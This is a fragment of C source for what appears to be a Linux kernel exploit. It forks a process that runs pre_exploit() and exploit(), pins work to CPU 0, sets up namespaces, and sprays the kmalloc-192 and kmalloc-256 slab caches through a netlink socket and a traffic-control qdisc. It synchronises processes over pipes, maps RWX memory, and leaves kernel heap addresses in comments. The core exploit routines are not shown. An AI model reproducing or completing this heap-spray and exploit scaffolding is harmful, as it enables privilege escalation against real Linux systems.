  if (pipe(pipe_file_spray[1]) == -1)   // end spray file
    err(1, "[-] fail to create pipes\n");
  cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);

// 0. preprocess & start main exploit
  if (fork() == 0) 
  {
    pin_on_cpu(0);
    pre_exploit();  // set up process memory / working dir / namespace
    exploit();      // main exploit
  } else 
  {
    sleep(2);
    
// 1. spray thread - core 0         spray kmalloc-192 & kmalloc-256
      setup_namespace();
      pin_on_cpu(0);
      int sprayfd = socket(PF_NETLINK, SOCK_RAW, 0);
      assert(sprayfd != -1);
      add_qdisc(sprayfd);
// 1-1. prepare payload
      char msg[0x10] = {};
      char payload[256] = {};
      memset(payload + 0x10, 'A', 256 - 0x10);



      if (write(pipe_child[1], "OK", 2) != 2) 
        err(1, "[-] write to parent\n");

      if (read(pipe_parent[0], msg, 2) != 2) 
        err(1, "[-] read from parent");


    if (write(pipe_child[1], "OK", 2) != 2) 
        err(1, "[-] write to parent\n");

   

      if (read(pipe_parent[0], msg, 2) != 2) 
        err(1, "[-] read from parent");


    }
  
}

int main(int argc, char **argv) {
  global = (char *)mmap(NULL, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_SHARED | MAP_ANON, -1, 0);
  memset(global, 0, 0x2000);


// run_exp() in sub-process
  assert(pipe(pipe_main) == 0);
  if (fork() == 0) {
    run_exp();                  // main exploit
    while (1) {sleep(10000);}
  }

}
//0xffff888006597b40
//0xffff888007735d80